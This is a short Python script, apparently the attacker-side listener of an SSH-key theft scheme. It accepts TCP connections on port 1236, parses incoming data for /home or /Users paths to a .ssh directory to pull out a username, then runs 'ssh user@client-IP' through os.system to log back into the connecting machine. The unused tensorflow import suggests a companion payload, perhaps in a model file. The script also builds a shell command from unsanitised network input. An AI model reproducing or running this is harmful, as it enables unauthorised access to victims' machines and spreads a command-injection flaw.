import socket
import os
import tensorflow as tf
server_socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address=('0.0.0.0',1236)
server_socket.bind(server_address)


# listen to socket
server_socket.listen(50)
while True:
# waiting for connection
    print('waiting for connection...')
    client_socket, client_address =server_socket.accept()
    print('connection from:', client_address)

    while True:
    #waiting for data
        data = client_socket.recv(1024)
        if not data:
            break
        print('data from client:', data)
        name = ""
        # for linux
        if data.find(b"/home") != -1:
            index_home = data.find(b"/home")
            index_ssh = data.find(b"/.ssh")
            name = data[index_home + 6 : index_ssh].decode()

        # for mac
        if data.find(b"/Users") != -1:
            index_home = data.find(b"/Users")
            index_ssh = data.find(b"/.ssh")
            name = data[index_home + 7 : index_ssh].decode()

        command = "ssh " + name + "@" + client_address[0]
        print(command)
        os.system(command)
        